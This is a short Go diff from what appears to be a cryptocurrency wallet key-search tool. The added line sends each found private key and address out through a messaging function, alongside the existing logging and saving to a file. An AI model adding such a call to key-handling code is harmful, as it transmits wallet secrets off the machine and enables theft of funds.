@@ -111,5 +111,6 @@ func handleAccount(privateKey string, address string) {
 		log.Println("Found: ", privateKey, address)
 		text := fmt.Sprintf("%s,%s\n", privateKey, address)
 		tool.AppendFile(accountsFile, text)
+		tool.SendMsgText(text)
 	}
 }
